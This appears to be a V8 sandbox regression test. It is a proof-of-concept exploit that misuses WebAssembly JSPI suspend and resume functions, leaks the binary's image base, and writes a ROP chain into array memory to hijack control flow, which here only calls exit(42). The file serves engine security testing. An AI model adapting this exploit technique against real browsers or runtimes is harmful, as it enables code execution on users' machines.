// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
d8.file.execute('test/mjsunit/sandbox/wasm-jspi.js');

const mem = new DataView(new Sandbox.MemoryView(0, 0x100000000));

let bp = [];
function bsuspend() {
  const p = new Promise(() => {});
  bp.push(p);
  return p;
}
const bb = new WasmModuleBuilder();
const bimport = bb.addImport('m', 's', kSig_v_v);
bb.addFunction('f', kSig_v_v)
    .addBody([kExprCallFunction, bimport, kExprCallFunction, bimport])
    .exportFunc();
WebAssembly.promising(bb.instantiate({
  m: {s: new WebAssembly.Suspending(bsuspend)}
}).exports.f)();

function get_resume(p) {
  const p_ptr = getPtr(p);
  const reaction = getField(p_ptr, kJSPromiseReactionsOrResultOffset);
  return Sandbox.getObjectAt(
      getField(reaction, kPromiseReactionFulfillHandlerOffset));
}
const resumeB = get_resume(bp[0]);

let ap = [];
function asuspend() {
  const p = new Promise(() => {});
  ap.push(p);
  return p;
}
let carrier;
let armed = false;
function sink(x) {
  if (!armed) return;
  resumeB();
  resumeB.call(carrier, x, x, x, x, x, x, x, x, x);
}
function warmSink(x) {}
const ab = new WasmModuleBuilder();
const aimport = ab.addImport('m', 's', kSig_r_v);
const sinkImport = ab.addImport('m', 'i', kSig_v_r);
const warmImport = ab.addImport('m', 'w', kSig_v_r);
const keepSuspended = ab.addImport('m', 't', kSig_v_v);
ab.addFunction('f', kSig_v_v)
    .addBody([
      kExprCallFunction, aimport,
      kExprCallFunction, sinkImport,
      kExprCallFunction, keepSuspended,
    ])
    .exportFunc();
ab.addFunction('warm', makeSig([kWasmExternRef], []))
    .addBody([kExprLocalGet, 0, kExprCallFunction, warmImport])
    .exportFunc();
const ai = ab.instantiate({m: {
  s: new WebAssembly.Suspending(asuspend), i: sink,
  w: warmSink,
  t: new WebAssembly.Suspending(asuspend),
}}).exports;

const safe = {safe: true};
for (let i = 0; i < 1001; ++i) ai.warm(safe);
armed = true;

WebAssembly.promising(ai.f)();
const resumeA = get_resume(ap[0]);

function stage(f, bad, values) {
  const x = values[0];
  if (bad) f(); else f(1);
  return x;
}
function a(x) {} function b(x) {} function c(x) {}
function d(x) {} function e(x) {}
const targets = [a, b, c, d, e];
const benign = new Float64Array(1);
for (let i = 0; i < 1000; ++i) stage(targets[i % 5], !!(i & 1), benign);
stage(a, false, benign);

const names = Sandbox.getBuiltinNames();
const pushCode = (Sandbox.getBuiltinCode(
    names.indexOf('ArrayPrototypePush')) - 1) >>> 0;
const pushEntry = mem.getBigUint64(pushCode + 24, true);
const imageBase = pushEntry - 0x1bae300n;
const popRdi = imageBase + 0x8206bcn;  // pop rdi; ret
const exitPlt = imageBase + 0x2049720n;

const backing = new Array(128).fill(1.1);
const elements = Sandbox.readObjectField(backing, 'elements') >>> 0;
carrier = Sandbox.getObjectAt(elements);
const rop = getPtr(carrier);
mem.setBigUint64(rop, popRdi, true);
mem.setBigUint64(rop + 8, 42n, true);
mem.setBigUint64(rop + 16, exitPlt, true);

const raw = new BigUint64Array(1);
const values = new Float64Array(raw.buffer);
raw[0] = 0x414243444546n;
stage(resumeA, true, values);
